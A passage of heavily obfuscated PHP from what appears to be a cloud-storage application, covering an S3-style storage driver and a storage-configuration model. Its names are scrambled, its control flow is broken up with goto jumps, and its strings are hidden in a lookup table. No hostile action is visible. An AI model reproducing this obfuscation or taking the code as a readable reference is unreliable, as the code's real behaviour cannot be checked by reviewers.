listAll($B§á–àĞÔ) { $FØˆÊöƒ© =& $_SERVER[¬ı§†‰ú˜¼]; $c‰ÁğÀ„Œ… = $this->fileList($B§á–àĞÔ, $FØˆÊöƒ©[33], !0); $d˜ÃâÆ¼¾ = array(); foreach ($c‰ÁğÀ„Œ…[$FØˆÊöƒ©[74]] as $Eì¨£¸Ğ–ò) { $d˜ÃâÆ¼¾[$Eì¨£¸Ğ–ò[$FØˆÊöƒ©[28]]] = $Eì¨£¸Ğ–ò[$FØˆÊöƒ©[78]]; } foreach ($c‰ÁğÀ„Œ…[$FØˆÊöƒ©[75]] as $Eì¨£¸Ğ–ò) { if (is_string($Eì¨£¸Ğ–ò)) { $d˜ÃâÆ¼¾[$Eì¨£¸Ğ–ò] = 0; } } return $this->listAllFiles($B§á–àĞÔ, array_keys($d˜ÃâÆ¼¾), $d˜ÃâÆ¼¾); } public function canRead($C¬†ˆ³İ½) { $aÕÏ¡ÄãÛ =& $_SERVER[¬ı§†‰ú˜¼]; $eÏêŠÔÅª = $this->client->getAccessControlPolicy($this->bucket, $C¬†ˆ³İ½); if (!$eÏêŠÔÅª) { return !1; } return in_array($eÏêŠÔÅª, array($aÕÏ¡ÄãÛ[204], $aÕÏ¡ÄãÛ[205], $aÕÏ¡ÄãÛ[206])) ? !0 : !1; } public function canWrite($A¶¡¨Ë÷Ÿ†) { $BÅãÁÙ¯ÜÉ =& $_SERVER[¬ı§†‰ú˜¼]; $aÄÙóÚŸù = $this->client->getAccessControlPolicy($this->bucket, $A¶¡¨Ë÷Ÿ†); if (!$aÄÙóÚŸù) { return !1; } return in_array($aÄÙóÚŸù, array($BÅãÁÙ¯ÜÉ[204], $BÅãÁÙ¯ÜÉ[205])) ? !0 : !1; } public function getContent($bø·âî¾Òå) { return $this->client->getObject($this->bucket, $bø·âî¾Òå); } public function setContent($B×¡‡Œ…Ü, $F–½‡ˆ²ÙÑ = '', $A«‡œ¸ÌÆÍ = false) { goto CÀÃÇÄª¨; c‡ˆŸ­ˆÃ‰: $f­ÍÀÉµ¬¶ = $this->client->putObject($F–½‡ˆ²ÙÑ, $this->bucket, $B×¡‡Œ…Ü, $B”Ô¤åõ«İ[191], array(), $dÏƒòò¢); if (!$f­ÍÀÉµ¬¶) { return !1; } if ($A«‡œ¸ÌÆÍ) { return !0; } goto aÒÛÕâø×å; aÒÛÕâø×å: $this->cacheMethod(null, null); $f­ÍÀÉµ¬¶ = $this->copyFile($B×¡‡Œ…Ü, $B×¡‡Œ…Ü, array($B”Ô¤åõ«İ[207] => $f­ÍÀÉµ¬¶[$B”Ô¤åõ«İ[208]])); return $f­ÍÀÉµ¬¶ ? !0 : !1; goto aæíŒ¥œ½½; CÀÃÇÄª¨: $B”Ô¤åõ«İ =& $_SERVER[¬ı§†‰ú˜¼]; $B×¡‡Œ…Ü = $A«‡œ¸ÌÆÍ ? trim($B×¡‡Œ…Ü, $B”Ô¤åõ«İ[8]) . $B”Ô¤åõ«İ[8] : $B×¡‡Œ…Ü; $dÏƒòò¢ = get_file_mime(get_path_ext($B×¡‡Œ…Ü)); goto c‡ˆŸ­ˆÃ‰; aæíŒ¥œ½½: } public function fileSubstr($FÇğÉí†„¼, $dŠÛÁ‚Æî, $DŸÑáÀ½Ù®) { $D§°Ñ§ÆŸà = $dŠÛÁ‚Æî + $DŸÑáÀ½Ù® - 1; return $this->client->getObject($this->bucket, $FÇğÉí†„¼, array($_SERVER[¬ı§†‰ú˜¼][209] => "\142\171\x74\145\x73\x3d{$dŠÛÁ‚Æî}\x2d{$D§°Ñ§ÆŸà}")); } public function upload($fïç÷ˆ¾‚, $EÌÀÀĞÓ¸Š, $a„ã‹™œÔï = false, $C†…ëöˆÃ = REPEAT_REPLACE) { $FÀ¨•¥Óã =& $_SERVER[¬ı§†‰ú˜¼]; $E‚Óœ„‹ô¦ = array($FÀ¨•¥Óã[207] => @md5_file($EÌÀÀĞÓ¸Š)); $B¬Á´‰‚ª¶ = array($FÀ¨•¥Óã[210] => get_file_mime(get_path_ext($fïç÷ˆ¾‚))); if (IO::size($EÌÀÀĞÓ¸Š) <= 1024 * 1024 * 200) { $bÂÇù°¾Ã = $this->client->putObjectFile($EÌÀÀĞÓ¸Š, $this->bucket, $fïç÷ˆ¾‚, $FÀ¨•¥Óã[191], $E‚Óœ„‹ô¦, $B¬Á´‰‚ª¶); return !empty($bÂÇù°¾Ã) ? $this->getPathOuter($fïç÷ˆ¾‚) : !1; } $a¶­ï©‡Öå = $this->client->multiUploadObject($EÌÀÀĞÓ¸Š, $this->bucket, trim($fïç÷ˆ¾‚, $FÀ¨•¥Óã[8]), $E‚Óœ„‹ô¦, $B¬Á´‰‚ª¶); return $a¶­ï©‡Öå ? $this->getPathOuter($fïç÷ˆ¾‚) : !1; } public function download($b¡ƒÁÌÄ»¬, $A·¥“È§”î) { if (!@is_dir($this->pathFather($A·¥“È§”î)) && !IO::mkdir($this->pathFather($A·¥“È§”î))) { return !1; } $c¡ÑÛÆ¯¬à = $this->client->getObject($this->bucket, $b¡ƒÁÌÄ»¬, array(), $A·¥“È§”î); return $c¡ÑÛÆ¯¬à !== !1 ? $A·¥“È§”î : !1; } public function link($e¿ã’ğ‡šÎ, $báÈÑ¢’“ = array()) { $Aô£ÃĞ®—Ê =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->signVer == $Aô£ÃĞ®—Ê[211]) { return $this->client->getAuthenticatedURL($this->bucket, $e¿ã’ğ‡šÎ, 3600 * 12, $báÈÑ¢’“); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($e¿ã’ğ‡šÎ, $Aô£ÃĞ®—Ê[8]), 3600 * 12, $this->region, array(), !0, $báÈÑ¢’“); } public function fileOut($e…‘·ÁÀ´‰, $cŞ­Ò©Ôî = false, $aĞèè–ñÊ = false, $bË—£¿°œÚ = '') { goto BÓÌ¬‚ñ¶Ï; Cİ»ğÎ¦ç: $aÙë†‘¹‘Î = array($fÏ¤Œ”éÅò[215] => $cŞ­Ò©Ôî . $fÏ¤Œ”éÅò[216] . rawurlencode($aĞèè–ñÊ), $fÏ¤Œ”éÅò[217] => $Eó¾’‰æ‡æ); $C‹…Œ³×ç¨ = $this->link($e…‘·ÁÀ´‰, $aÙë†‘¹‘Î); $this->fileOutLink($C‹…Œ³×ç¨); goto C§ïÒ„ÆË‰; BÓÌ¬‚ñ¶Ï: $fÏ¤Œ”éÅò =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($e…‘·ÁÀ´‰, $cŞ­Ò©Ôî, $aĞèè–ñÊ, $bË—£¿°œÚ); } if (!$aĞèè–ñÊ) { $aĞèè–ñÊ = $this->pathThis($e…‘·ÁÀ´‰); } goto e™ˆ‘ªÆÏ; e™ˆ‘ªÆÏ: $Eó¾’‰æ‡æ = get_file_mime(get_path_ext($aĞèè–ñÊ)); if ($Eó¾’‰æ‡æ == $fÏ¤Œ”éÅò[212]) { return parent::fileOut($e…‘·ÁÀ´‰, $cŞ­Ò©Ôî, $aĞèè–ñÊ, $bË—£¿°œÚ); } $cŞ­Ò©Ôî = $cŞ­Ò©Ôî ? $fÏ¤Œ”éÅò[213] : $fÏ¤Œ”éÅò[214]; goto Cİ»ğÎ¦ç; C§ïÒ„ÆË‰: } public function fileOutServer($B†¨øµ£éã, $BŸİ˜†º÷ = false, $eªŠğƒö¢Ë = false, $A‡²Ç®¡ = '') { parent::fileOut($B†¨øµ£éã, $BŸİ˜†º÷, $eªŠğƒö¢Ë, $A‡²Ç®¡); } public function fileOutImageServer($fª ‘Ö¢¸Ì, $eÉ‡ÃÅ†¡— = 250) { parent::fileOutImage($fª ‘Ö¢¸Ì, $eÉ‡ÃÅ†¡—); } public function hashMd5($aŒ¥²‚Ï–…, $b”Ğ¾“…Îê = '') { $EÁÖè˜Œ“ =& $_SERVER[¬ı§†‰ú˜¼]; $Eˆç“ˆ§™¬ = $this->objectMeta($aŒ¥²‚Ï–…); if (!$Eˆç“ˆ§™¬) { return !1; } $b”Ğ¾“…Îê = $b”Ğ¾“…Îê ? $b”Ğ¾“…Îê : _get($Eˆç“ˆ§™¬, $EÁÖè˜Œ“[218]); $b”Ğ¾“…Îê = $b”Ğ¾“…Îê ? $b”Ğ¾“…Îê : _get($Eˆç“ˆ§™¬, $EÁÖè˜Œ“[208], $EÁÖè˜Œ“[33]); return $b”Ğ¾“…Îê; } public function uploadFormData($cê§­õğ…Ö, $EÌ»”ï‘ø = 3600) { $cõØö¯² =& $_SERVER[¬ı§†‰ú˜¼]; $DÒ’òŠë† = $this->pathFather($cê§­õğ…Ö); $BÄò°¦ŠÇê = $this->client->getHttpUploadPostParams($this->bucket, $DÒ’òŠë†, $cõØö¯²[191], $EÌ»”ï‘ø); return array_merge((array) $BÄò°¦ŠÇê, array($cõØö¯²[175] => $this->getHost())); } public function multiUploadFormData($FÅÄ—ÊÅ”ä, $cğË°ˆ¸øä = 3600) { $cã¹ùçÉ£› =& $_SERVER[¬ı§†‰ú˜¼]; $dë½Š¶™ÒÛ = gmdate($cã¹ùçÉ£›[219]); $bÖ¶ØÖƒÌ‘ = array(); $a‘¸Åœ¸´Ä = $this->client->getUploadId($this->bucket, $FÅÄ—ÊÅ”ä, $bÖ¶ØÖƒÌ‘); if (!$a‘¸Åœ¸´Ä) { return !1; } return array($cã¹ùçÉ£›[220] => $a‘¸Åœ¸´Ä, $cã¹ùçÉ£›[175] => $this->getHost() . $cã¹ùçÉ£›[8] . $this->pathEncode($FÅÄ—ÊÅ”ä), $cã¹ùçÉ£›[221] => $dë½Š¶™ÒÛ, $cã¹ùçÉ£›[93] => $FÅÄ—ÊÅ”ä); } public function multiUploadAuthData($cÌ†ìŞ¦”Ç, $cÇì¦–¿ªË = array()) { goto fµÂÂ‘ô ï; cÎË¦õø“: $f£˜âÇö‘ = $cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[93]]; unset($cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[93]]); if (isset($cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[222]])) { $cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[221]] = $D–…˜ÌãÊ; return $this->listUploadParts($f£˜âÇö‘, $cÇì¦–¿ªË); } goto Eî„“â·®; EŸ¸Ó‰¤²…: $bĞèâ¸±¨ = implode($CÖâÀ©ôŠÑ[228], $b°‚Ã…•Â); $cÃŞİ‘Ø—¾ = base64_encode(hash_hmac($CÖâÀ©ôŠÑ[229], $bĞèâ¸±¨, $this->secret, !0)); $a¾Ä¬æ™³Ï = $CÖâÀ©ôŠÑ[230] . $this->accessKey . $CÖâÀ©ôŠÑ[4] . $cÃŞİ‘Ø—¾; goto C­ÊƒÏ‘¸á; Eî„“â·®: $b°‚Ã…•Â = array($CÖâÀ©ôŠÑ[223], $CÖâÀ©ôŠÑ[33], $CÖâÀ©ôŠÑ[119], $CÖâÀ©ôŠÑ[33], "\x78\x2d\141\155\172\x2d\x64\141\x74\145\x3a{$D–…˜ÌãÊ}", $CÖâÀ©ôŠÑ[8] . $this->bucket . $CÖâÀ©ôŠÑ[8] . $this->pathEncode($f£˜âÇö‘) . $e›·ôÚÅ¢Á); if (strpos($e›·ôÚÅ¢Á, $CÖâÀ©ôŠÑ[224]) === 0) { $b°‚Ã…•Â[0] = $CÖâÀ©ôŠÑ[225]; } if (isset($cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[226]]) && $cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[226]] == $CÖâÀ©ôŠÑ[227]) { $b°‚Ã…•Â[0] = $CÖâÀ©ôŠÑ[227]; } goto EŸ¸Ó‰¤²…; fµÂÂ‘ô ï: $CÖâÀ©ôŠÑ =& $_SERVER[¬ı§†‰ú˜¼]; $D–…˜ÌãÊ = isset($cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[221]]) ? $cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[221]] : gmdate($CÖâÀ©ôŠÑ[219]); $e›·ôÚÅ¢Á = isset($cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[168]]) ? $cÇì¦–¿ªË[$CÖâÀ©ôŠÑ[168]] : $CÖâÀ©ôŠÑ[33]; goto cÎË¦õø“; C­ÊƒÏ‘¸á: if (strpos($e›·ôÚÅ¢Á, $CÖâÀ©ôŠÑ[224]) === 0) { return array($CÖâÀ©ôŠÑ[231] => $a¾Ä¬æ™³Ï, $CÖâÀ©ôŠÑ[221] => $D–…˜ÌãÊ); } return $a¾Ä¬æ™³Ï; goto F²§Ù„¤éÈ; F²§Ù„¤éÈ: } public function listUploadParts($eš©î¶ºÇ±, $E¦ÈÀ·Ë = array()) { goto DŠÃù¼½ÓŠ; A¿‰ìˆˆµô: $eÙåìøìí = $this->multiUploadAuthData($eš©î¶ºÇ±, $E¦ÈÀ·Ë); if (empty($eÙåìøìí)) { return !1; } return array($Dƒà³¿Ä’[231] => $eÙåìøìí, $Dƒà³¿Ä’[221] => $E¦ÈÀ·Ë[$Dƒà³¿Ä’[221]], $Dƒà³¿Ä’[233] => $EÔÊ¾ÔŸ›Ø); goto Bì‘£Úë­„; DŠÃù¼½ÓŠ: $Dƒà³¿Ä’ =& $_SERVER[¬ı§†‰ú˜¼]; $F¥Œ—ÉÎÂ = str_replace($Dƒà³¿Ä’[232], $Dƒà³¿Ä’[33], $E¦ÈÀ·Ë[$Dƒà³¿Ä’[168]]); $EÔÊ¾ÔŸ›Ø = $this->client->listParts($this->bucket, $eš©î¶ºÇ±, $F¥Œ—ÉÎÂ); goto FˆİŒºŞ˜„; FˆİŒºŞ˜„: if (!$EÔÊ¾ÔŸ›Ø) { return !1; } unset($E¦ÈÀ·Ë[$Dƒà³¿Ä’[222]], $E¦ÈÀ·Ë[$Dƒà³¿Ä’[226]]); $E¦ÈÀ·Ë[$Dƒà³¿Ä’[93]] = $eš©î¶ºÇ±; goto A¿‰ìˆˆµô; Bì‘£Úë­„: } public function getHost() { return parent::getHost() . $_SERVER[¬ı§†‰ú˜¼][8] . $this->bucket; } public function size($B§ËÖˆ›Í) { $C‰îñ™†÷í = $this->objectMeta($B§ËÖˆ›Í); return $C‰îñ™†÷í ? $C‰îñ™†÷í[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function info($e‘‡…é ) { if ($this->isFolder($e‘‡…é )) { return $this->folderInfo($e‘‡…é ); } else { if ($this->isFile($e‘‡…é )) { return $this->fileInfo($e‘‡…é ); } } return !1; } public function exist($Eç¥–Ç„è) { return $this->isFile($Eç¥–Ç„è) || $this->isFolder($Eç¥–Ç„è); } public function isFile($a¢éÒÆÑê÷) { return !$this->isFolder($a¢éÒÆÑê÷) && $this->objectMeta($a¢éÒÆÑê÷); } public function isFolder($cø…ÁìÑ¯) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][198], $cø…ÁìÑ¯); } protected function objectMeta($A‡Œ—¼¡•¥) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][199], $A‡Œ—¼¡•¥); } protected function _objectMeta($b“ğñ¿³ç¡) { $Eï³ãñÎÜÚ =& $_SERVER[¬ı§†‰ú˜¼]; $b“ğñ¿³ç¡ = rtrim($b“ğñ¿³ç¡, $Eï³ãñÎÜÚ[8]); try { $c¿ó¹çæ­Õ = $this->client->getObjectInfo($this->bucket, $b“ğñ¿³ç¡); if (!isset($c¿ó¹çæ­Õ[$Eï³ãñÎÜÚ[218]]) && isset($c¿ó¹çæ­Õ[$Eï³ãñÎÜÚ[234]])) { $c¿ó¹çæ­Õ[$Eï³ãñÎÜÚ[218]] = $c¿ó¹çæ­Õ[$Eï³ãñÎÜÚ[234]]; } } catch (Exception $F·ÒçàöÖ) { $c¿ó¹çæ­Õ = !1; } if (!$c¿ó¹çæ­Õ) { } return $c¿ó¹çæ­Õ; } protected function _isFolder($EíßõÑ×Ù) { goto Dø±²»ùâ; Eï×Çò„ˆø: $E‰â¹ Şóİ = $this->client->getBucket($this->bucket, $EíßõÑ×Ù, null, 1); if (empty($E‰â¹ Şóİ[$Dñ±’ÈßÄ£[197]])) { return !1; } $E²†¡È¬Îá = $E‰â¹ Şóİ[$Dñ±’ÈßÄ£[197]][0][$Dñ±’ÈßÄ£[28]]; goto f¢µ‰Êâ‘; f¢µ‰Êâ‘: if (substr($E²†¡È¬Îá, -1) == $Dñ±’ÈßÄ£[8]) { return !0; } if (get_path_this($E²†¡È¬Îá) == get_path_this($EíßõÑ×Ù)) { return !1; } return !0; goto aˆ‰ø¢–´; Dø±²»ùâ: $Dñ±’ÈßÄ£ =& $_SERVER[¬ı§†‰ú˜¼]; $EíßõÑ×Ù = rtrim($EíßõÑ×Ù, $Dñ±’ÈßÄ£[8]); if ($EíßõÑ×Ù == $Dñ±’ÈßÄ£[33] || $EíßõÑ×Ù == $Dñ±’ÈßÄ£[8]) { return !0; } goto Eï×Çò„ˆø; aˆ‰ø¢–´: } } define($_SERVER[¬ı§†‰ú˜¼][235], 1); goto eÍ¢°ˆˆ‘Û; cÑ—íâ§á: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\163\164\x6f\x72\141\147\145\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\163\x69\x7a\x65\x4d\141\170", "\x73\171\x73\164\x65\155", "\144\145\x66\x61\x75\x6c\164", "\x64\162\151\166\x65\162", "\x63\x6f\156\146\151\147"); public function listData($dÎ†ó“Ğ = false, $eÄíÍ‡‰½È = "\x6d\x6f\x64\151\146\x79\x54\151\x6d\145", $b§‡ğÕŸ¯Å = false) { $eİ°ÛÑƒ¸ =& $_SERVER[¬ı§†‰ú˜¼]; $e¸ÇÊ£âÙŒ = parent::listData($dÎ†ó“Ğ, $eÄíÍ‡‰½È, $b§‡ğÕŸ¯Å); if ($dÎ†ó“Ğ) { return $e¸ÇÊ£âÙŒ; } $E…‚Ò¿å© = $this->ioSizeUseGet(array_to_keyvalue($e¸ÇÊ£âÙŒ, $eİ°ÛÑƒ¸[33], $eİ°ÛÑƒ¸[392])); foreach ($e¸ÇÊ£âÙŒ as $aã–Êˆ·œè => $cù  ÅÇÍµ) { unset($e¸ÇÊ£âÙŒ[$aã–Êˆ·œè][$eİ°ÛÑƒ¸[6]]); $e¸ÇÊ£âÙŒ[$aã–Êˆ·œè][$eİ°ÛÑƒ¸[1676]] = isset($E…‚Ò¿å©[$cù  ÅÇÍµ[$eİ°ÛÑƒ¸[392]]]) ? $E…‚Ò¿å©[$cù  ÅÇÍµ[$eİ°ÛÑƒ¸[392]]] : 0; } return $e¸ÇÊ£âÙŒ; } public function ioSizeUseGet($E÷Ö¦ƒÜ§³) { goto aƒÓ”áÔØ; B‰Èë´óØš: $FçÈ˜Õ ” = Cache::get($AŠ—¾æ…¸¤); if ($FçÈ˜Õ ”) { return $FçÈ˜Õ ”; } $fï˜ã‘˜Œç = array($CÍ“ÃŸÜ‰ß[790] => $CÍ“ÃŸÜ‰ß[392], $CÍ“ÃŸÜ‰ß[1990] => $CÍ“ÃŸÜ‰ß[78]); goto eù­Û·öì£; eù­Û·öì£: $BË³ôäŠ» = array($CÍ“ÃŸÜ‰ß[790] => array($CÍ“ÃŸÜ‰ß[7], $E÷Ö¦ƒÜ§³)); $FçÈ˜Õ ” = Model($CÍ“ÃŸÜ‰ß[748])->field($fï˜ã‘˜Œç)->where($BË³ôäŠ»)->group($CÍ“ÃŸÜ‰ß[790])->select(); $FçÈ˜Õ ” = array_to_keyvalue($FçÈ˜Õ ”, $CÍ“ÃŸÜ‰ß[392], $CÍ“ÃŸÜ‰ß[78]); goto B¢‹ò›İÎ÷; aƒÓ”áÔØ: $CÍ“ÃŸÜ‰ß =& $_SERVER[¬ı§†‰ú˜¼]; if (!$E÷Ö¦ƒÜ§³) { return array(); } $AŠ—¾æ…¸¤ = $CÍ“ÃŸÜ‰ß[1989] . implode($CÍ“ÃŸÜ‰ß[47], $E÷Ö¦ƒÜ§³); goto B‰Èë´óØš; B¢‹ò›İÎ÷: Cache::set($AŠ—¾æ…¸¤, $FçÈ˜Õ ”, 600); return $FçÈ˜Õ ”; goto B©ˆÃËÊ÷; B©ˆÃËÊ÷: } public function getConfig($D§ñ¡ˆÅ÷ï) { $a‹„†É«–Ù = parent::listData($D§ñ¡ˆÅ÷ï); return json_decode($a‹„†É«–Ù[$_SERVER[¬ı§†‰ú˜¼][6]], !0); } public function update($d£ù¿Ê…·•, $E¡ºÁÚÎÀŒ) { goto béÓí®È¥; d¬º©¨ƒóÉ: if (isset($b”ˆôùÆã¼[$d‘‹ÜĞêÖ]) && $b”ˆôùÆã¼[$d‘‹ÜĞêÖ][$cÃìÛ†Œ½ß[392]] != $d£ù¿Ê…·•) { return !1; } if (isset($E¡ºÁÚÎÀŒ[$cÃìÛ†Œ½ß[1991]]) && $E¡ºÁÚÎÀŒ[$cÃìÛ†Œ½ß[1991]] == $cÃìÛ†Œ½ß[87]) { $this->checkConfig($E¡ºÁÚÎÀŒ); } unset($E¡ºÁÚÎÀŒ[$cÃìÛ†Œ½ß[1991]]); goto e¸†®¯„°™; e¸†®¯„°™: $aÚªÏô“È = parent::update($d£ù¿Ê…·•, $E¡ºÁÚÎÀŒ); if ($aÚªÏô“È && $E¡ºÁÚÎÀŒ[$cÃìÛ†Œ½ß[34]]) { foreach ($b”ˆôùÆã¼ as $fÜÁÓ«Š“î) { if ($fÜÁÓ«Š“î[$cÃìÛ†Œ½ß[34]] && $fÜÁÓ«Š“î[$cÃìÛ†Œ½ß[392]] != $d£ù¿Ê…·•) { parent::update($fÜÁÓ«Š“î[$cÃìÛ†Œ½ß[392]], array($cÃìÛ†Œ½ß[34] => 0)); } } } return $aÚªÏô“È; goto eëÍÒš†œ¤; béÓí®È¥: $cÃìÛ†Œ½ß =& $_SERVER[¬ı§†‰ú˜¼]; $d‘‹ÜĞêÖ = $E¡ºÁÚÎÀŒ[$cÃìÛ†Œ½ß[28]]; $b”ˆôùÆã¼ = array_to_keyvalue(parent::listData(), $cÃìÛ†Œ½ß[28]); goto d¬º©¨ƒóÉ; eëÍÒš†œ¤: } public function add($c»ÀñõĞˆÈ) { goto eˆš¢Ÿ®˜Ñ; fµÄƒ‡·¯¹: $this->checkConfig($c»ÀñõĞˆÈ); $F©áöšàî§ = parent::insert($c»ÀñõĞˆÈ); if ($F©áöšàî§ && $c»ÀñõĞˆÈ[$aìßƒ‚°à½[34]]) { foreach ($Dä†×ƒî‡ as $Fñ£ŸÒÌä) { if ($Fñ£ŸÒÌä[$aìßƒ‚°à½[34]]) { parent::update($Fñ£ŸÒÌä[$aìßƒ‚°à½[392]], array($aìßƒ‚°à½[34] => 0)); } } } goto D‡°ãÁÎµ; eˆš¢Ÿ®˜Ñ: $aìßƒ‚°à½ =& $_SERVER[¬ı§†‰ú˜¼]; $Dä†×ƒî‡ = array_to_keyvalue(parent::listData(), $aìßƒ‚°à½[28]); if (isset($Dä†×ƒî‡[$c»ÀñõĞˆÈ[$aìßƒ‚°à½[28]]])) { return !1; } goto fµÄƒ‡·¯¹; D‡°ãÁÎµ: return $F©áöšàî§; goto e„™ò§¾ƒ; e„™ò§¾ƒ: } public function checkConfig(&$f¤¶Û¸ƒÁä) { goto d‘×Û‰Ü‹; eÖÍ™èå¥Æ: foreach ($EÈ¿Õ¶¨µÉ as $EÌ„Å‹ó¶ => $E“ŒÃšè‰‚) { $EÈ¿Õ¶¨µÉ[$EÌ„Å‹ó¶] = trim($E“ŒÃšè‰‚); } $EÈ¿Õ¶¨µÉ[$eÈîˆœ­×´[1992]] = rand_string(6); $FÒ“¢òÜˆ¬ = $GLOBALS[$eÈîˆœ­×´[6]][$eÈîˆœ­×´[88]][$eÈîˆœ­×´[799]]; goto A“Á¨Ä–¦´; d‘×Û‰Ü‹: $eÈîˆœ­×´ =& $_SERVER[¬ı§†‰ú˜¼]; $DÜ°‘¤›·Š = strtolower($f¤¶Û¸ƒÁä[$eÈîˆœ­×´[94]]); $EÈ¿Õ¶¨µÉ = json_decode($f¤¶Û¸ƒÁä[$eÈîˆœ­×´[6]], !0); goto eÖÍ™èå¥Æ; fÅ­ÖÄÎÏ©: $f¤¶Û¸ƒÁä[$eÈîˆœ­×´[6]] = json_encode($EÈ¿Õ¶¨µÉ); $f¤¶Û¸ƒÁä[$eÈîˆœ­×´[94]] = $BğÖ¦«‹ÍŸ; return !0; goto a™è¯„Õæ; eéî–œìÛ»: $aĞ†õ‡¶™” = new $AšƒïùÊ§¶($EÈ¿Õ¶¨µÉ); if (in_array($DÜ°‘¤›·Š, $aĞ†õ‡¶™”->objectDriver)) { if (!$aĞ†õ‡¶™”->isBucketCors() && !$aĞ†õ‡¶™”->setBucketCors()) { $bœÃø´ªêŞ = LNG($eÈîˆœ­×´[1996]); $bœÃø´ªêŞ .= $eÈîˆœ­×´[1997] . LNG($eÈîˆœ­×´[1998]); show_json($bœÃø´ªêŞ, !1); } } $d÷¡à´ĞĞ = rtrim($EÈ¿Õ¶¨µÉ[$eÈîˆœ­×´[1075]], $eÈîˆœ­×´[8]) . $eÈîˆœ­×´[8]; goto bº±òå‹Ïó; A“Á¨Ä–¦´: $BğÖ¦«‹ÍŸ = isset($FÒ“¢òÜˆ¬[$DÜ°‘¤›·Š]) ? $FÒ“¢òÜˆ¬[$DÜ°‘¤›·Š] : ucfirst($DÜ°‘¤›·Š); $AšƒïùÊ§¶ = $eÈîˆœ­×´[72] . $BğÖ¦«‹ÍŸ; if (!$BğÖ¦«‹ÍŸ || !class_exists($AšƒïùÊ§¶)) { write_log(array($eÈîˆœ­×´[1993], $f¤¶Û¸ƒÁä, get_caller_info()), $eÈîˆœ­×´[1994]); show_json(LNG($eÈîˆœ­×´[1995]), !1, $f¤¶Û¸ƒÁä); } goto eéî–œìÛ»; bº±òå‹Ïó: $CšÌêŒÃ©“ = $aĞ†õ‡¶™”->getPath($d÷¡à´ĞĞ . $eÈîˆœ­×´[1136]); if (!$aĞ†õ‡¶™”->mkfile($CšÌêŒÃ©“)) { show_json(LNG($eÈîˆœ­×´[1996]), !1); } $EÈ¿Õ¶¨µÉ[$eÈîˆœ­×´[1075]] = $d÷¡à´ĞĞ; goto fÅ­ÖÄÎÏ©; a™è¯„Õæ: } public function driverListSystem() { $b•Œ‡ÎïË =& $_SERVER[¬ı§†‰ú˜¼]; $dôŠÌº¯ë¤ = parent::listData(); $c¹ôÈø”Ÿ¥ = array(); foreach ($dôŠÌº¯ë¤ as $Fœ¥Øš¿Ç·) { unset($Fœ¥Øš¿Ç·[$b•Œ‡ÎïË[193]], $Fœ¥Øš¿Ç·[$b•Œ‡ÎïË[84]]); $Fœ¥Øš¿Ç·[$b•Œ‡ÎïË[6]] = json_decode($Fœ¥Øš¿Ç·[$b•Œ‡ÎïË[6]], !0); $c¹ôÈø”Ÿ¥[] = $Fœ¥Øš¿Ç·; } return $c¹ôÈø”Ÿ¥; } public function defaultDriver() { $D‰ïÅÇï =& $_SERVER[¬ı§†‰ú˜¼]; $aŞ­»ƒ÷Ë° = parent::listData(); $fÌÈ‚íõ±” = array_filter_by_field($aŞ­»ƒ÷Ë°, $D‰ïÅÇï[34], 1); $fÌÈ‚íõ±” = $fÌÈ‚íõ±”[0]; if ($fÌÈ‚íõ±”) { $fÌÈ‚íõ±”[$D‰ïÅÇï[6]] = json_decode($fÌÈ‚íõ±”[$D‰ïÅÇï[6]], !0); } return $fÌÈ‚íõ±”; } public function driverInfo($f‹‚º—¢í) { $báŸ½Òİ½ =& $_SERVER[¬ı§†‰ú˜¼]; $E˜£ÇÑò = array_to_keyvalue(parent::listData(), $báŸ½Òİ½[392]); if (!isset($E˜£ÇÑò[$f‹‚º—¢í])) { return !1; } $fÈèì²•â = $E˜£ÇÑò[$f‹‚º—¢í]; $fÈèì²•â[$báŸ½Òİ½[6]] = json_decode($fÈèì²•â[$báŸ½Òİ½[6]], !0); return $fÈèì²•â; } public function remove($dµô¦»íçä) { $this->removeShareItems($dµô¦»íçä); return parent::remove($dµô¦»íçä); } public function removeWithFile($DªÑ’³ŠÎ÷, $bÖ¤Ú¿Áà) { goto DŞà¸¸Á¨; a¬¤œ½Ú‡: $Eî¨“•½¹®->task[$C°’ŞªÕÙÛ[724]] = (double) $fÓƒ®ÃÖØÇ; $cë’‰Ãºã‹ = KodIO::defaultDriver(); $F¬Õ††³¢³ = $cë’‰Ãºã‹[$C°’ŞªÕÙÛ[392]]; goto a‚Ç“„»¡; DŞà¸¸Á¨: $C°’ŞªÕÙÛ =& $_SERVER[¬ı§†‰ú˜¼]; $EÃÀ‰„¡„Ï = array($C°’ŞªÕÙÛ[790] => $DªÑ’³ŠÎ÷); $eì„ç–ÂÃâ = Model($C°’ŞªÕÙÛ[448])->where($EÃÀ‰„¡„Ï)->count(); goto a®Öì¿ò„«; a®Öì¿ò„«: $fÓƒ®ÃÖØÇ = Model($C°’ŞªÕÙÛ[448])->where($EÃÀ‰„¡„Ï)->sum($C°’ŞªÕÙÛ[78]); $F—ñŠ­•± = $bÖ¤Ú¿Áà . $C°’ŞªÕÙÛ[1999] . $DªÑ’³ŠÎ÷; $Eî¨“•½¹® = new TaskFileTransfer($F—ñŠ­•±, $C°’ŞªÕÙÛ[1994], $eì„ç–ÂÃâ, LNG($C°’ŞªÕÙÛ[2000]) . "\x28{$DªÑ’³ŠÎ÷}\51"); goto a¬¤œ½Ú‡; a©‹‹›Ğ‚¬: if (!$d³†ÉïŒç…) { $Eî¨“•½¹®->stop($F—ñŠ­•±); return !1; } $Eî¨“•½¹®->end(); if ($bÖ¤Ú¿Áà == $C°’ŞªÕÙÛ[1656]) { $this->remove($DªÑ’³ŠÎ÷); } goto aô¬—’¤”ë; a‚Ç“„»¡: $eÏÜƒÜ‰İê = 